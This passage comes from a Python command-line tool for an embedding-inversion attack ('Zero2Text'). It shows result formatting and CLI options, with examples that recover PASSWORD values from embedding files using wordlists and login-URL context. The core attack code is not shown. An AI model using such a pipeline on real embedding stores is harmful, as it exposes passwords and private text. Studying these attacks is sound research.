    """Format a number with comma separators."""
    try:
        return f"{int(n):,}"
    except (ValueError, TypeError):
        return str(n)


def format_results(results: List[Dict], verbose: bool = False) -> str:
    """Format results for display."""

    output = []
    output.append("\n========================================")
    output.append("  RESULTS SUMMARY")
    output.append("========================================")

    validated = []
    unvalidated = []
    false_positives = []

    for r in results:
        sf = r.get("slot_filling", {})
        n_templates = sf.get("top_k_count", 0)
        for slot, info in sf.get("slots", {}).items():
            entry = {
                "chunk": r.get("chunk_idx", "?"),
                "slot": slot,
                "value": info["value"],
                "similarity": info["similarity"],
                "margin": info["margin"],
                "consensus": info["consensus"],
                "raw_consensus": info.get("raw_consensus", 0),
                "confidence": info["confidence"],
                "z_score": info.get("z_score", 0),
                "z_gap": info.get("z_gap", 0),
                "margin_z_score": info.get("margin_z_score", 0),
                "margin_z_gap": info.get("margin_z_gap", 0),
                "percentile": info.get("percentile", 0),
                "n_templates": n_templates,
                "separation_ratio": info.get("separation_ratio", 0.0),
            }

            if info["confidence"] == "HIGH":
                validated.append(entry)
            elif info["confidence"] in ["MEDIUM", "LOW"]:
                unvalidated.append(entry)
            else:
                false_positives.append(entry)

    all_entries = validated + unvalidated + false_positives
    if all_entries:
        output.append("\n  Extracted values:\n")
        for c in all_entries:
            rc = c['raw_consensus']
            nt = c['n_templates']
            sep_ratio = c.get('separation_ratio', 0.0)
            marker = _result_marker(c['confidence'])
            label = _user_confidence(c['confidence'], rc, nt, sep_ratio)
            output.append(f"    {marker} {c['slot']} = {c['value']}")
            output.append(f"        {label}")
            output.append(f"        Chunk {c['chunk']} "
                          f"| Best template: {c['similarity']*100:.1f}% match")
            if sep_ratio and sep_ratio != float('inf'):
                output.append(f"        Separation ratio: {sep_ratio:.1f}x")
            if verbose:
                output.append(
                    f"        [tier={c['confidence']} "
                    f"z={c['z_score']:.2f} gap={c['z_gap']:.2f} "
                    f"mz={c['margin_z_score']:.2f} "
                    f"mgap={c['margin_z_gap']:.2f} "
                    f"margin={c['margin']:.4f} "
                    f"pctl={c['percentile']:.1f}% "
                    f"sep_ratio={sep_ratio:.1f}x]")

    # Zero2Text inversion results
    z2t_results = [r for r in results if r.get("zero2text")]
    if z2t_results:
        output.append("\n  Inversions:\n")
        for r in z2t_results:
            z = r["zero2text"]
            output.append(
                f"    Chunk {r['chunk_idx']}: "
                f"{z['similarity']*100:.1f}% similarity")
            output.append(f"      \"{z['text'][:70]}...\"")

    # Stats
    scored = "?"
    if results:
        scored = _format_number(results[0].get("templates_scored", "?"))
    output.append(f"\n  Stats: {len(results)} chunk(s) analyzed, "
                  f"{scored} templates scored")
    output.append(f"  Validated: {len(validated)} "
                  f"| Needs verification: {len(unvalidated)} "
                  f"| Rejected: {len(false_positives)}")

    return "\n".join(output)


# ============================================================================
# SECTION 10: CLI
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='Improved Zero2Text Embedding Inversion Pipeline',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic (direct mode, 32 tokens)
  python zero2text_impl_improved.py embeddings2.npy --chunk 0 \\
      --templates templates.json --wordlist passwords.txt \\
      --slots PASSWORD --default-URL login.megacorpone.ai

  # With 80-token generation
  python zero2text_impl_improved.py embeddings2.npy --chunk 0 --max-tokens 80 \\
      --templates templates.json --wordlist passwords.txt \\
      --slots PASSWORD --default-URL login.megacorpone.ai

  # Dual-embedder mode (full paper approach)
  python zero2text_impl_improved.py embeddings2.npy --chunk 0 \\
      --local-model sentence-transformers/all-mpnet-base-v2 \\
      --templates templates.json --wordlist passwords.txt \\
      --slots PASSWORD

  # Multiple chunks
  python zero2text_impl_improved.py embeddings2.npy --chunks 0,1,2 \\
      --templates templates.json --wordlist passwords.txt

  # All chunks
  python zero2text_impl_improved.py embeddings2.npy --all \\
      --templates templates.json --wordlist passwords.txt

  # Fill PASSWORD slot with custom URL context
  python zero2text_impl_improved.py embeddings2.npy --chunk 0 \\
      --templates templates.json --wordlist passwords.txt \\
      --slots PASSWORD \\
      --default-URL https://login.mycompany.com --default-USERNAME admin

  # With diversity clustering and relative threshold
  python zero2text_impl_improved.py embeddings2.npy --chunk 0 \\
      --templates templates.json --wordlist passwords.txt \\
      --similarity-floor 0.80 --max-seeds 40 --min-seeds 8 \\
      --diversity-threshold 0.80
        """
    )

    parser.add_argument('embeddings_file', type=str, help='Path to embeddings.npy')

    # Chunk selection
    parser.add_argument('--chunk', type=int, default=None, help='Single chunk index')
    parser.add_argument('--chunks', type=str, default=None,
                        help='Comma-separated chunk indices')
    parser.add_argument('--all', action='store_true', help='Attack all chunks')
    parser.add_argument('--max-chunks', type=int, default=50,
                        help='Max chunks when using --all (default: 50)')

    # Templates
    parser.add_argument('--templates', type=str, default=None,
                        help='Template JSON file (from template_generator.py)')
    parser.add_argument('--bank', type=str, default=None,
                        help='Template bank directory (sharded .json.gz)')
    parser.add_argument('--max-templates', type=int, default=100000,
                        help='Max templates to load (default: 100000)')

    # Top-K (legacy alias — sets max_seeds=min_seeds=top_k for fixed mode)
    parser.add_argument('--top-k', type=int, default=20,
                        help='Number of top seed templates (legacy; sets max-seeds=min-seeds=top-k)')

    # Improvement 4: Relative threshold for template selection
    parser.add_argument('--similarity-floor', type=float, default=0.85,
                        help='Relative similarity floor as fraction of top-1 (default: 0.85)')
    parser.add_argument('--max-seeds', type=int, default=50,
                        help='Maximum number of seed templates (default: 50)')
    parser.add_argument('--min-seeds', type=int, default=5,
                        help='Minimum number of seed templates (default: 5)')

    # Improvement 1: Template diversity clustering
    parser.add_argument('--diversity-threshold', type=float, default=0.85,
                        help='Diversity clustering cosine threshold for templates (default: 0.85)')

    # Zero2Text hyperparameters
    parser.add_argument('--max-tokens', type=int, choices=[32, 50, 80, 100],
                        default=32,
                        help='Max tokens for Zero2Text generation (default: 32)')
    parser.add_argument('--lm-model', type=str, default='gpt2',
                        help='Language model for token generation (default: gpt2)')
    parser.add_argument('--local-model', type=str, default=None,
                        help='Local embedder for dual-embedder mode (enables ridge regression)')
    parser.add_argument('--beam-width', type=int, default=10,
                        help='Beam width K_B (default: 10)')
    parser.add_argument('--k-s', type=int, default=1000,
                        help='Candidate tokens per beam K_S (default: 1000)')
    parser.add_argument('--k-a', type=int, default=50,
                        help='Query budget per step K_A (default: 50)')
    parser.add_argument('--z2t-diversity-threshold', type=float, default=0.9,
                        help='Zero2Text beam diversity filter cosine threshold (default: 0.9)')
    parser.add_argument('--ridge-lambda', type=float, default=0.1,
                        help='Ridge regression regularization (default: 0.1)')
    parser.add_argument('--decay-gamma', type=float, default=0.8,
                        help='Query budget decay factor (default: 0.8)')

    # Slot filling
    parser.add_argument('--wordlist', type=str, default=None,
                        help='Wordlist file for slot filling')
    parser.add_argument('--slots', type=str, default=None,
                        help='Target slots (comma-separated, e.g. PASSWORD,URL)')

    # Model / device
    parser.add_argument('--model', type=str,
                        default='sentence-transformers/all-MiniLM-L6-v2',
                        help='Embedding model (default: all-MiniLM-L6-v2)')
    parser.add_argument('--device', type=str, default='auto',
                        help='Device: auto, cuda, cpu, mps')
    parser.add_argument('--batch-size', type=int, default=256,
                        help='Embedding batch size (default: 256)')

    # Entropy
    parser.add_argument('--entropy-threshold', type=float, default=3.5,
                        help='Shannon entropy threshold (default: 3.5)')

    # Output
    parser.add_argument('--output', '-o', type=str, default=None,
                        help='Save JSON results to file')
    parser.add_argument('--verbose', '-v', action='store_true',
                        help='Show full technical metrics in output')

    args, remaining = parser.parse_known_args()

    # Parse --default-SLOTNAME VALUE args
    slot_defaults = {}
    i = 0
    while i < len(remaining):
        if remaining[i].startswith('--default-'):
            slot_name = remaining[i][len('--default-'):].upper().replace('-', '_')
            if i + 1 < len(remaining) and not remaining[i + 1].startswith('--'):
                slot_defaults[slot_name] = remaining[i + 1]
                i += 2
            else:
                parser.error(f"{remaining[i]} requires a value")
        else:
            parser.error(f"Unrecognized argument: {remaining[i]}")
            i += 1

    # Load embeddings
    print(f"\n[+] Loading: {args.embeddings_file}")
    embeddings = np.load(args.embeddings_file)
    if len(embeddings.shape) == 1:
        embeddings = embeddings.reshape(1, -1)
    print(f"    Shape: {embeddings.shape}")

    # Determine chunks
    if args.all:
        chunk_indices = list(range(min(len(embeddings), args.max_chunks)))
    elif args.chunks:
        chunk_indices = [int(c.strip()) for c in args.chunks.split(',')]
    elif args.chunk is not None:
        chunk_indices = [args.chunk]
    else:
        chunk_indices = [0]

    # --- Handle --top-k as legacy alias ---
    # If the user explicitly passed --top-k but NOT --max-seeds/--min-seeds,
    # treat it as fixed mode: max_seeds = min_seeds = top_k
    top_k_explicitly_set = any(
        a.startswith('--top-k') for a in sys.argv[1:]
    )
    max_seeds_explicitly_set = any(
        a.startswith('--max-seeds') for a in sys.argv[1:]
    )
    min_seeds_explicitly_set = any(
        a.startswith('--min-seeds') for a in sys.argv[1:]
    )

    effective_max_seeds = args.max_seeds
    effective_min_seeds = args.min_seeds

    if top_k_explicitly_set and not max_seeds_explicitly_set:
        effective_max_seeds = args.top_k
    if top_k_explicitly_set and not min_seeds_explicitly_set:
        effective_min_seeds = args.top_k

    # Build config
    config = Zero2TextConfig(
        embedding_model=args.model,
        device=args.device,
        batch_size=args.batch_size,
        bank_path=args.bank,
        templates_json=args.templates,
        max_templates=args.max_templates,
        top_k=args.top_k,
        similarity_floor_pct=args.similarity_floor,
        max_seeds=effective_max_seeds,
        min_seeds=effective_min_seeds,
        diversity_threshold=args.diversity_threshold,
        lm_model=args.lm_model,
        local_model=args.local_model,
        beam_width=args.beam_width,
        k_s=args.k_s,
        k_a=args.k_a,
        max_tokens=args.max_tokens,
        z2t_diversity_threshold=args.z2t_diversity_threshold,
        ridge_lambda=args.ridge_lambda,
        decay_gamma=args.decay_gamma,
        wordlist_path=args.wordlist,
        target_slots=([s.strip().upper() for s in args.slots.split(',')]
                      if args.slots else None),
        neutral_defaults=slot_defaults if slot_defaults else None,
        entropy_threshold=args.entropy_threshold,
        verbose=args.verbose,
    )

    # Run pipeline
    pipeline = Zero2TextPipeline(config)
    results = pipeline.attack_chunks(embeddings, chunk_indices)

    # Display
    print(format_results(results, verbose=config.verbose))

    # Save
    if args.output:
        output_data = {
            "pipeline": "zero2text_improved",
            "timestamp": datetime.now().isoformat(),
            "embeddings_file": args.embeddings_file,
            "config": {
                "embedding_model": config.embedding_model,
                "local_model": config.local_model,
                "beam_width": config.beam_width,
                "k_s": config.k_s,
                "k_a": config.k_a,
                "max_tokens": config.max_tokens,
                "z2t_diversity_threshold": config.z2t_diversity_threshold,
                "ridge_lambda": config.ridge_lambda,
                "decay_gamma": config.decay_gamma,
                "top_k": config.top_k,
                "similarity_floor_pct": config.similarity_floor_pct,
                "max_seeds": config.max_seeds,
                "min_seeds": config.min_seeds,
                "diversity_threshold": config.diversity_threshold,
                "entropy_threshold": config.entropy_threshold,
                "templates_json": config.templates_json,
            },
            "results": results,
        }

        with open(args.output, 'w') as f:
            json.dump(output_data, f, indent=2, default=str)
        print(f"\n[+] Results saved to {args.output}")

    return results


if __name__ == "__main__":
    main()
```